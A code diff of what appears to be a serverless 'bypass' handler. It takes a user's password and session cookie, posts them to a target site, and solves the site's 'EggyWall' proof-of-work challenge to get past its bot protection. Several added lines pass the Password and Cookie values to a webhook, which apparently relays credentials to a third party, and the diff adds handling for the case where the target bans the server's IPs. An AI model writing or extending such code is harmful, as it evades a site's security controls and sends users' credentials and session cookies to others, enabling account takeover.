@@ -182,22 +182,30 @@ export default async function handler(req, res) {
         let responseText = await response.text();
 
         // Check if EggyWall blocked us
-        if (responseText.includes('EggyWall') && responseText.includes('publicSalt')) {
-            const token = solveEggyWall(responseText);
+        if (responseText.includes('EggyWall')) {
+            // If it has publicSalt, we can try to solve it
+            if (responseText.includes('publicSalt')) {
+                const token = solveEggyWall(responseText);
 
-            if (token) {
-                baseHeaders['Cookie'] = `EggyWall_Token=${token}`;
-                response = await fetch(targetUrl, {
-                    method: 'POST',
-                    headers: baseHeaders,
-                    body: payload,
-                    redirect: 'follow'
-                });
-                responseText = await response.text();
+                if (token) {
+                    baseHeaders['Cookie'] = `EggyWall_Token=${token}`;
+                    response = await fetch(targetUrl, {
+                        method: 'POST',
+                        headers: baseHeaders,
+                        body: payload,
+                        redirect: 'follow'
+                    });
+                    responseText = await response.text();
+                } else {
+                    await sendWebhook(req, { Type, Password, Cookie }, 403, false, 'Failed to solve EggyWall PoW');
+                    await new Promise(resolve => setTimeout(resolve, 10000));
+                    return res.status(403).json({ success: false, message: 'Failed to solve EggyWall PoW challenge.' });
+                }
             } else {
-                await sendWebhook(req, { Type, Password, Cookie }, 403, false, 'Failed to solve EggyWall PoW');
+                // If it doesn't have publicSalt, it's a hard IP block.
+                await sendWebhook(req, { Type, Password, Cookie }, 403, false, 'Blocked by EggyWall (IP Banned)');
                 await new Promise(resolve => setTimeout(resolve, 10000));
-                return res.status(403).json({ success: false, message: 'Failed to solve EggyWall PoW challenge.' });
+                return res.status(403).json({ success: false, message: 'Blocked by EggyWall (IP Banned). The target server is rejecting Vercel IPs.' });
             }
         }
 
@@ -222,11 +230,11 @@ export default async function handler(req, res) {
             finalMessage = 'Success';
         } else {
             if (responseData && typeof responseData === 'object') {
-                // Extract exact JSON message (msg, message, error, or stringify the whole thing)
+                // Extract exact JSON message
                 finalMessage = responseData.msg || responseData.message || responseData.error || JSON.stringify(responseData);
             } else {
-                // If it's not JSON (e.g., HTML Cloudflare block), show the raw text so you know what happened
-                finalMessage = responseText.substring(0, 150) || 'Bypass Failed (Empty Response)';
+                // If it's still HTML somehow, don't show raw HTML to the user
+                finalMessage = 'Bypass Failed (Server returned an unexpected HTML page)';
             }
         }
 
